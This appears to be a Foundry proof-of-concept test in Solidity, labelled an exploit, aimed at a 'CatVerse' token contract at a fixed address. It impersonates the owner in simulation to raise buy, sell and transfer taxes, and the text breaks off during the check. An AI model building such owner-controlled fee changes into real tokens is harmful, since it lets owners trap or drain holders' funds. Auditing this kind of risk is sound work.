interface CatVerse {
    function getOwner() external view returns (address);
    function setTaxes(uint16 buyFee, uint16 sellFee, uint16 transferFee) external;
    function _taxRates() external view returns (uint16 buyFee, uint16 sellFee, uint16 transferFee);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────
    address constant TARGET = 0x89031AaFA457245469E9641387aa94BFB51cB964;
    address attacker = address(this);
    CatVerse target;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        target = CatVerse(TARGET);
        vm.label(TARGET, "CatVerse Contract");
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get current owner address
        address owner = target.getOwner();
        vm.label(owner, "Original Owner");

        // Impersonate the owner to gain privileged access
        vm.startPrank(owner);

        // Exploit: Change tax rates - set buyFee to 2000 (maximum allowed)
        // This demonstrates owner privilege abuse - the owner can arbitrarily change taxes
        target.setTaxes(2000, 1000, 1000);

        vm.stopPrank();

        // Verify the exploit succeeded - buyFee should now be 2000, not 1000
        (uint16 buyFee, uint16 sellFee, uint16 transferFee) = target._taxRates();
